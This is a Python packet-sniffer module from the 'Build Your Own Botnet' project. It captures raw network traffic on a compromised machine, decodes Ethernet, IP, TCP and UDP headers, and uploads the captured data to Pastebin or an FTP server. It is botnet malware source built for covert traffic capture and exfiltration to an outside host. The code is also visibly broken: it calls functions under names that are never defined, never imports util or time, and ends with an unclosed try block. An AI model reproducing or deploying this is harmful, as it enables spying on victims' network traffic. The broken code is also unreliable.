#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function
import struct
import socket
import binascii
import cStringIO


_buffer = []


def _udp_header(data):
    try:
        udp_hdr = struct.unpack('!4H', data[:8])
        src = udp_hdr[0]
        dst = udp_hdr[1]
        length = udp_hdr[2]
        chksum = udp_hdr[3]
        data = data[8:]
        _buffer.append(', ================== UDP HEADER ==================, ')
        _buffer.append(', ================================================, ')
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Source', src))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Dest', dst))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Length', length))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chksum))
        _buffer.append(', ================================================, ')
        return data
    except Exception as e:
        _buffer.append("Error in {} header: '{}'".format('UDP', str(e)))


def _tcp_header(recv_data):
    try:
        tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
        src_port = tcp_hdr[0]
        dst_port = tcp_hdr[1]
        seq_num = tcp_hdr[2]
        ack_num = tcp_hdr[3]
        data_ofs = tcp_hdr[4] >> 12
        reserved = (tcp_hdr[4] >> 6) & 0x03ff
        flags = tcp_hdr[4] & 0x003f
        flagdata = {
            'URG' : bool(flags & 0x0020),
            'ACK' : bool(flags & 0x0010),
            'PSH' : bool(flags & 0x0008),
            'RST' : bool(flags & 0x0004),
            'SYN' : bool(flags & 0x0002),
            'FIN' : bool(flags & 0x0001)
        }
        win = tcp_hdr[5]
        chk_sum = tcp_hdr[6]
        urg_pnt = tcp_hdr[7]
        recv_data = recv_data[20:]
        _buffer.append(', ================== TCP HEADER ==================, ')
        _buffer.append(', ================================================, ')
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Source', src_port))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Target', dst_port))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Seq Num', seq_num))
        _buffer.append(', {:>20} ,  {}\t\t , '.format('Ack Num', ack_num))
        _buffer.append(', {:>20} ,  {}\t\t , '.format('Flags', ', '.join([flag for flag in flagdata if flagdata.get(flag)])))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Window', win))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chk_sum))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Urg Pnt', urg_pnt))
        _buffer.append(', ================================================, ')
        return recv_data
    except Exception as e:
        _buffer.append("Error in {} header: '{}'".format('TCP', str(e)))


def _ip_header(data):
    try:
        ip_hdr = struct.unpack('!6H4s4s', data[:20])
        ver = ip_hdr[0] >> 12
        ihl = (ip_hdr[0] >> 8) & 0x0f
        tos = ip_hdr[0] & 0x00ff
        tot_len = ip_hdr[1]
        ip_id = ip_hdr[2]
        flags = ip_hdr[3] >> 13
        fragofs = ip_hdr[3] & 0x1fff
        ttl = ip_hdr[4] >> 8
        ipproto = ip_hdr[4] & 0x00ff
        chksum = ip_hdr[5]
        src = socket.inet_ntoa(ip_hdr[6])
        dest = socket.inet_ntoa(ip_hdr[7])
        data = data[20:]
        _buffer.append(', ================== IP HEADER ===================, ')
        _buffer.append(', ================================================, ')
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('VER', ver))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('IHL', ihl))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('TOS', tos))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Length', tot_len))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('ID', ip_id))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Flags', flags))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Frag Offset', fragofs))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('TTL', ttl))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Next Protocol', ipproto))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Check Sum', chksum))
        _buffer.append(', {:>20} ,  {}\t\t , '.format('Source IP', src))
        _buffer.append(', {:>20} ,  {}\t\t , '.format('Dest IP', dest))
        _buffer.append(', ================================================, ')
        return data, ipproto
    except Exception as e:
        _buffer.append("Error in {} header: '{}'".format('IP', str(e)))


def _eth_header(data):
    try:
        ip_bool = False
        eth_hdr = struct.unpack('!6s6sH', data[:14])
        dst_mac = binascii.hexlify(eth_hdr[0])
        src_mac = binascii.hexlify(eth_hdr[1])
        proto = eth_hdr[2] >> 8
        _buffer.append(', ================================================, ')
        _buffer.append(', ================== ETH HEADER ==================, ')
        _buffer.append(', ================================================, ')
        _buffer.append(', {:>20} ,  {}\t , '.format('Target MAC', '{}:{}:{}:{}:{}:{}'.format(dst_mac[0:2],dst_mac[2:4],dst_mac[4:6],dst_mac[6:8],dst_mac[8:10],dst_mac[10:12])))
        _buffer.append(', {:>20} ,  {}\t , '.format('Source MAC', '{}:{}:{}:{}:{}:{}'.format(src_mac[0:2],src_mac[2:4],src_mac[4:6],src_mac[6:8],src_mac[8:10],src_mac[10:12])))
        _buffer.append(', {:>20} ,  {}\t\t\t , '.format('Protocol', proto))
        _buffer.append(', ================================================, ')
        if proto == 8:
            ip_bool = True
        data = data[14:]
        return data, ip_bool
    except Exception as e:
        _buffer.append("Error in {} header: '{}'".format('ETH', str(e)))


@util.threaded
def packetsniffer(mode, seconds=30):
    try:
        if mode not in ('pastebin','ftp'):
            return "Error: invalid upload mode '%s'" % str(mode)
        limit   = time.time() + seconds
        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        while time.time() < limit:
            try:
                recv_data = sniffer_socket.recv(2048)
                recv_data, ip_bool = packetsniffer_eth_header(recv_data)
                if ip_bool:
                    recv_data, ip_proto = packetsniffer_ip_header(recv_data)
                    if ip_proto == 6:
                        recv_data = packetsniffer_tcp_header(recv_data)
                    elif ip_proto == 17:
                        recv_data = packetsniffer_udp_header(recv_data)
            except: break
        try:
            sniffer_socket.close()
        except: pass
        try:
            output = cStringIO.StringIO('\n'.join(_buffer))
            result = util.pastebin(output) if 'ftp' not in mode else util.ftp(output, filetype='.pcap')
    except Exception as e:
        util.debug("{} error: {}".format(packetsniffer.func_name, str(e)))
